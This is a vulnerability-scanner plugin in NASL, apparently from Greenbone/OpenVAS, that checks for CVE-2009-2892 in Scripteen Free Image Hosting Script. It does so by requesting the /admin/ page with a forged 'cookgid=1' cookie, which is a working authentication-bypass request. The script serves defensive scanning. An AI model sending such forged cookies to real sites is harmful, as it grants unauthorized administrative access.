# SPDX-FileCopyrightText: 2009 Greenbone AG
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.100246");
  script_version("2023-12-13T05:05:23+0000");
  script_tag(name:"last_modification", value:"2023-12-13 05:05:23 +0000 (Wed, 13 Dec 2023)");
  script_tag(name:"creation_date", value:"2009-07-26 19:54:54 +0200 (Sun, 26 Jul 2009)");
  script_tag(name:"cvss_base", value:"7.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_cve_id("CVE-2009-2892");
  script_name("Scripteen Free Image Hosting Script Multiple Vulnerabilities");
  script_category(ACT_GATHER_INFO);
  script_family("Web application abuses");
  script_copyright("Copyright (C) 2009 Greenbone AG");
  script_dependencies("find_service.nasl", "no404.nasl", "webmirror.nasl", "DDI_Directory_Scanner.nasl", "gb_php_http_detect.nasl", "global_settings.nasl");
  script_require_ports("Services/www", 80);
  script_exclude_keys("Settings/disable_cgi_scanning");

  script_tag(name:"summary", value:"Scripteen Free Image Hosting Script is prone to multiple SQL-injection
  vulnerabilities and to an authentication-bypass vulnerability.");

  script_tag(name:"impact", value:"Exploiting these issues could allow an attacker to compromise the
  application, access or modify data, exploit latent vulnerabilities
  in the underlying database or to gain administrative access.");

  script_tag(name:"affected", value:"Scripteen Free Image Hosting Script 2.3 is vulnerable. Other versions
  may also be affected.");

  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/35800");
  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/35801");
  script_xref(name:"URL", value:"http://www.scripteen.com/scripts/scripteen-free-image-hosting-script.html#more-10");

  script_tag(name:"qod_type", value:"remote_app");
  script_tag(name:"solution_type", value:"WillNotFix");

  script_tag(name:"solution", value:"No known solution was made available for at least one year since the disclosure
  of this vulnerability. Likely none will be provided anymore. General solution options are to upgrade to a newer
  release, disable respective features, remove the product or replace the product by another one.");

  exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");
include("port_service_func.inc");
include("list_array_func.inc");

port = http_get_port(default:80);
if(!http_can_host_php(port:port))exit(0);

host = http_host_name( port:port );

foreach dir( make_list_unique( "/", http_cgi_dirs( port:port ) ) ) {

  if( dir == "/" ) dir = "";
  url = string(dir, "/login.php");
  buf = http_get_cache(item:url, port:port);

  if(egrep(pattern: "Scripteen Free Image Hosting Script", string: buf, icase: TRUE)) {

    url = dir + "/admin/";
    req = string("GET ", url, " HTTP/1.1\r\n",
              "Host: ", host, "\r\n",
              "User-Agent: ", http_get_user_agent(), "\r\n",
              "Accept-Language: en-us,en,de;\r\n",
              "Cookie: cookgid=1\r\n",
              "Connection: close\r\n\r\n");
    buf = http_keepalive_send_recv(port:port, data:req, bodyonly:TRUE);

    if(egrep(pattern:"Admin Control Panel", string:buf) &&
       egrep(pattern:"Total Members", string:buf) &&
       egrep(pattern:"Total images", string:buf)) {
      report = http_report_vuln_url( port:port, url:url );
      security_message( port:port, data:report );
      exit( 0 );
    }
  }
}

exit( 99 );
